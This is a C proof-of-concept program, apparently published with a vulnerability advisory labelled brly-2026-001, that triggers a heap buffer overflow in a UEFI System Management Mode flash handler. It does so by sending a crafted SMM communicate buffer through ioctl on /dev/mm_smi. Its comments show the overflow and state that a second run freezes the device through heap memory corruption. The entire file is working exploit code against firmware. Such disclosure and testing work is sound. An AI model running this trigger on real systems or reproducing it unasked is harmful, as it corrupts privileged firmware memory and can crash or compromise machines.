#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/mm_smi"

typedef struct {
  uint32_t data1;
  uint16_t data2;
  uint16_t data3;
  uint8_t data4[8];
} __attribute__((packed)) efi_guid_t;

typedef struct {
  efi_guid_t header_guid;
  uint64_t message_length;
  uint8_t data[];
} __attribute__((packed)) efi_smm_communicate_header_t;

typedef struct {
  uint64_t output_data_size;
  uint64_t command;
  uint64_t status;
  int64_t index;
  uint8_t data[];
} __attribute__((packed)) comm_buffer_flash_t;

static efi_smm_communicate_header_t *
alloc_request(efi_guid_t guid, size_t data_size, size_t *total_size) {
  size_t cb_size = data_size;
  *total_size = sizeof(efi_smm_communicate_header_t) + cb_size;

  efi_smm_communicate_header_t *req = malloc(*total_size);
  if (!req) {
    perror("malloc");
    return NULL;
  }

  req->header_guid = guid;
  req->message_length = cb_size;
  return req;
}

static int send_ioctl(efi_smm_communicate_header_t *req) {
  int fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("open " DEVICE_PATH);
    return -1;
  }

  int ret = ioctl(fd, 0, req);
  if (ret < 0) {
    perror("ioctl");
  }

  close(fd);
  return ret;
}

int main(int argc, char *argv[]) {
  efi_smm_communicate_header_t *req;
  size_t total_size;
  int ret;

  efi_guid_t flash_guid = {
      .data1 = 0x32b8b022,
      .data2 = 0x2c86,
      .data3 = 0x4326,
      .data4 = {0x93, 0x96, 0x5d, 0x8b, 0x4b, 0x9e, 0x7b, 0xfe}};

  // to trigger brly-2026-001, we will set the `data` size to 32
  // and use function with `index` 0
  //
  // during the first run, we will see that the `status` is EFI_NOT_FOUND
  // (because FLASH_PROTOCOL is not installed), and `output_size` is 0x4d,
  // meaning that the data buffer has overflowed
  // > ./brly-2026-001
  // index: 0
  // data size: 32 bytes
  // triggering MM handler
  // MM handler triggered
  // status=0x800000000000000e output_size=0x4d
  //
  // during the second run, the device will freeze due to heap memory corruption
  // > ./brly-2026-001
  // index: 0
  // data size: 32 bytes
  // triggering MM handler

  int64_t index = 0; // FlashRead
  size_t data_size = 32;

  printf("index: %ld\n", index);
  printf("data size: %zu bytes\n", data_size);

  req = alloc_request(flash_guid, sizeof(comm_buffer_flash_t) + data_size,
                      &total_size);
  if (!req) {
    return 1;
  }

  comm_buffer_flash_t *flash_buf = (comm_buffer_flash_t *)req->data;
  flash_buf->output_data_size =
      req->message_length - sizeof(comm_buffer_flash_t);
  flash_buf->command = 0;
  flash_buf->status = -1;
  flash_buf->index = index;
  memset(flash_buf->data, 0, data_size);

  printf("triggering MM handler\n");

  ret = send_ioctl(req);
  if (ret < 0) {
    free(req);
    return 1;
  }

  printf("MM handler triggered\n");

  printf("status=0x%lx output_size=0x%lx\n", flash_buf->status,
         flash_buf->output_data_size);

  free(req);

  return 0;
}
